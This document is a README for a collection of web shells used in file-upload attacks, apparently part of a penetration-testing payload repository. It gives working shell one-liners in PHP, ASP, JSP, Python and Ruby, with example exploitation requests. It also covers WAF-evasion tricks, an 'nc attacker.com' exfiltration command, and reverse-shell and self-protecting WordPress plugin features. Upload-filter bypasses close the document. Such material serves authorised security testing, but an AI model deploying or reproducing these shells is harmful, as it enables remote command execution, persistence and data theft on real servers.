# Web Shells

Functional web shells across six server-side languages and one WordPress-specific variant. Use these after confirming via [`../Test/`](../Test/) which execution-capable extensions the upload endpoint accepts.

---

## Quick Reference

| File | Language | Trigger | Command param | Auth |
|---|---|---|---|---|
| `PHP/0.php` | PHP | GET | `0` | None |
| `PHP/0_echo.php` | PHP | GET | `0` | None |
| `PHP/cmd.php` | PHP | GET | `cmd` | None |
| `PHP/script.php` | PHP | GET | hardcoded | None |
| `ASP/webshell.asp` | Classic ASP | GET | `cmd` | None |
| `ASP/webshell2.asp` | ASP.NET (C#) | GET | `cmd` | None |
| `ASP/cmdasp.asp` | Classic ASP | POST form | `.CMD` | None |
| `ASP/cmd-asp-5.1.asp` | Classic ASP | POST form | `C` | None |
| `ASPX/cmd.asmx` | ASP.NET (C#) | SOAP POST | `Z1` (binary), `Z2` (args) | None |
| `CFM/cfexec.cfm` | ColdFusion | POST form | `cmd` + `opts` | None |
| `JSP/webshell.jsp` | Java JSP | GET | `cmd` | None |
| `Perl/perlcmd.cgi` | Perl CGI | GET (query string) | raw query | None |
| `Perl/perlweb_shell.pl` | Perl CGI | GET | `command` | `yourpassword` |
| `Perl/perl-webshell-rst-ghc.pl` | Perl CGI | POST | `CMD` | `r57` |
| `Python/webshell.py` | Python CGI | GET | `cmd` | None |
| `Python/python-webshell.py` | Python CGI | — | hardcoded | None |
| `Python/pty-shell.py` | Python | — | — | None |
| `Ruby/srwsh.rb` | Ruby CGI | GET | `cmd` | None |
| `Ruby/simple-ruby-shell.rb` | Ruby | — | — | None |
| `WordPress/plugin-shell.php` | PHP (WP plugin) | GET/POST | `cmd` | None |

---

## PHP

### `PHP/0_echo.php`

```php
<?=`$_GET[0]`?>
```

Minimal one-liner. Uses the short echo tag (`<?=`) and backtick execution. The command is passed as GET parameter `0`.

```
GET /uploads/0_echo.php?0=id HTTP/1.1
```

**Why it matters:** Bypasses WAF rules that look for `system`, `exec`, `shell_exec`, or `passthru` — uses the backtick operator instead. The `0` parameter name also evades rules matching common parameter names like `cmd`.

---

### `PHP/script.php`

```php
<script language="php">system("script");</script>
```

Uses the legacy `<script language="php">` tag syntax. The command is hardcoded; edit before uploading. Tests whether the server executes this non-standard PHP opening tag (accepted by older PHP versions and some parsers that reject standard `<?php` tags).

---

## ASP (Classic ASP / VBScript)

### `ASP/webshell.asp`

```asp
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

One-liner. Uses `WScript.Shell.Exec()` to run the command from the `cmd` GET parameter and writes stdout directly to the response.

```
GET /uploads/webshell.asp?cmd=whoami HTTP/1.1
```

---

### `ASP/webshell2.asp`

ASP.NET C# inline page. Uses `System.Diagnostics.Process` with `RedirectStandardOutput` to capture and return command output. Declared with `<%@ Page Language="C#" %>` — requires ASP.NET, not classic IIS-only ASP.

```
GET /uploads/webshell2.asp?cmd=whoami HTTP/1.1
```

---

### `ASP/cmdasp.asp`

Classic VBScript shell with an HTML form (POST). Uses `WScript.Shell` and `WScript.Network`. Displays the machine name and current username above the output. Command sent via POST parameter `.CMD`.

Source: michaeldaw.org

---

### `ASP/cmd-asp-5.1.asp`

VBScript shell targeting **IIS 5.1** (Windows XP). Runs commands by writing output to a temp file under `c:\windows\pchealth\ERRORREP\QHEADLES\`, then reads and deletes it. Uses `cacls.exe` to set permissions on the temp file. Includes computer name and username in the output. Command sent via POST parameter `C`.

Source: brett.moore / security-assessment.com

---

## ASPX (ASP.NET Web Service)

### `ASPX/cmd.asmx`

An ASP.NET **SOAP web service** shell. Exposes a `Test` method that accepts two parameters — `Z1` (executable path) and `Z2` (arguments) — and returns command output in a CDATA block.

**Usage — SOAP POST:**

```http
POST /uploads/cmd.asmx/Test HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/Test"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Test xmlns="http://tempuri.org/">
      <Z1>cmd.exe</Z1>
      <Z2>/c whoami</Z2>
    </Test>
  </soap:Body>
</soap:Envelope>
```

**Why it matters:** The `.asmx` extension is often overlooked in upload allowlists. Output is returned inside `<![CDATA[-->|...|<--]]>` delimiters in the XML response.

---

## ColdFusion

### `CFM/cfexec.cfm`

HTML form shell using the `<cfexecute>` tag. Three fields: **Command** (e.g. `c:\windows\system32\cmd.exe`), **Options** (e.g. `/c whoami`), and **Timeout** (seconds). Output is displayed in a `<pre>` block.

**Note:** `cfexecute` can be disabled by a ColdFusion administrator. If disabled, it can be re-enabled via `/CFIDE/administrator` if you have access.

Source: Kurt Grutzmacher / michaeldaw.org

---

## JSP

### `JSP/webshell.jsp`

```java
String c = request.getParameter("cmd");
BufferedReader b = new BufferedReader(
    new InputStreamReader(Runtime.getRuntime().exec(c).getInputStream()));
```

Executes the `cmd` GET parameter via `Runtime.getRuntime().exec()` and streams output line by line to the response.

```
GET /uploads/webshell.jsp?cmd=id HTTP/1.1
```

**Note:** `exec(String)` does not invoke a shell — commands with shell operators (`|`, `>`, `&&`) must be wrapped: `cmd=/bin/sh -c "id | nc attacker.com 443"`. Pass as an array to split on spaces correctly, or use `new String[]{"/bin/sh","-c",command}` if modifying the shell.

---

## Perl

### `Perl/perlcmd.cgi`

Simple CGI shell. The entire URL query string is used as the command.

```
GET /cgi-bin/perlcmd.cgi?cat+/etc/passwd HTTP/1.1
```

URL-decodes `%20` to spaces and `%3b` to semicolons before executing. Source: michaeldaw.org

---

### `Perl/perlweb_shell.pl`

Password-protected shell (default: `yourpassword`, change before deploying). Accepts `command` and `pwd` GET parameters. Supports `cd <dir>` to change directories between requests — the current directory is persisted via the `pwd` parameter. Non-`cd` commands are executed with backticks.

---

### `Perl/perl-webshell-rst-ghc.pl`

Full-featured Perl web shell by RST/GHC (v1.0, 2005). Password-protected (default: `r57`). Features:

- **Command execution** with a pre-built alias library (find SUID files, find writable directories, show open ports, find `.htpasswd` files, etc.)
- **Directory navigation** — persistent working directory
- **File upload** from client and from remote URL (HTTP fetch)
- **File view/edit** — read and write files directly in the browser
- **File download** — force-download any readable file
- **Port bind** — listens on a specified port and spawns `/bin/bash` or `cmd.exe`
- **Backconnect** — reverse shell to a specified IP:port

Works on both Unix and Windows (configurable via `$unix` flag).

---

## Python

### `Python/webshell.py`

CGI-based shell using the `cgi` and `subprocess` modules. Reads the `cmd` parameter and returns `subprocess.getoutput(command)` wrapped in `<pre>` tags.

```
GET /uploads/webshell.py?cmd=id HTTP/1.1
```

Requires the server to execute the `.py` file as CGI (Apache `AddHandler cgi-script .py`, or equivalent).

---

### `Python/python-webshell.py`

Minimal stub:

```python
import os
os.system("id")
```

Command is hardcoded. Edit before uploading. Useful for a quick proof of execution where CGI output headers are not needed.

---

### `Python/pty-shell.py`

```python
import pty; pty.spawn("/bin/bash")
```

Spawns a fully interactive PTY bash shell. Not a web shell — run directly on the server (e.g., after uploading and triggering execution, or as a follow-up to a non-interactive shell). Provides readline support, job control, and interactive commands like `su` and `ssh`.

---

## Ruby

### `Ruby/srwsh.rb`

Small Ruby CGI shell. Reads the `cmd` GET parameter, executes via `%x(...)`, and renders output in a styled HTML textarea. URL-decodes the parameter before execution.

```
GET /cgi-bin/srwsh.rb?cmd=id HTTP/1.1
```

Requires Ruby CGI execution (Apache `AddHandler cgi-script .rb` or `cgi-bin` directory).

---

### `Ruby/simple-ruby-shell.rb`

```ruby
exec "/bin/bash"
```

One-liner. Replaces the current process with `/bin/bash`. Not a web shell — run directly on the server or as a follow-up to establish an interactive session.

---

## WordPress Plugin Shell

### `WordPress/plugin-shell.php`

Packaged as a **WordPress plugin** (`Plugin Name: Cheap & Nasty Wordpress Shell`). Upload as a `.zip` through the WordPress admin panel (`Plugins → Add New → Upload Plugin`), then activate.

**Shell URL after activation:**
```
http://target.com/wp-content/plugins/shell/shell.php?cmd=id
```

**Features:**
- Accepts `cmd` via GET or POST (POST avoids logging the command in Apache access logs)
- **Execution fallback chain** — tries `ReflectionFunction('system')` → `call_user_func_array` → `call_user_func` → `passthru` → `system`, working around `disable_functions` restrictions
- **Reverse shell mode** — pass `ip=<attacker>` and `port=<port>` to open a `/bin/sh -i` socket
- **Self-protection** — runs `chmod ugo-w` and `chattr +i` on itself to prevent deletion

**Prerequisites:** WordPress admin credentials or a file upload vulnerability that places files in the plugins directory.

---

## Deployment Notes

- **Extension bypasses:** If the target blocks `.php`, try `.phtml`, `.php5`, `.php7`, `.php-s` — see [`../Test/`](../Test/) for the full list of variants to probe, and fuzz with [`../Fuzzing/extensions.txt`](../Fuzzing/extensions.txt).
- **`.htaccess` assist:** If the server accepts `.htaccess` uploads, use [`../Content Overwrite/.htaccess_rce`](../Content%20Overwrite/.htaccess_rce) to make the server execute arbitrary extensions as PHP before uploading a shell with a non-blocked extension.
- **Double extension:** If the allowlist checks only the last extension, upload `shell.php.jpg` — with the right `.htaccess` or server misconfiguration, the `.php` component will be executed.
- **JSP note:** `Runtime.exec(String)` splits on spaces — commands with arguments should be tested with `cmd=id` first, then escalate to array-based invocation for complex commands.
- **ColdFusion note:** `cfexec.cfm` requires the full path to the executable on Windows (e.g. `c:\windows\system32\cmd.exe`), not just `cmd`.

---

## Related Sections

- [`../Test/`](../Test/) — Probe which extensions the endpoint accepts before choosing a shell
- [`../Content Overwrite/`](../Content%20Overwrite/) — Use `.htaccess_rce` or `php_ini_overwrite.ini` to enable execution for non-standard extensions
- [`../EICAR/`](../EICAR/) — AV detection testing for uploaded executables
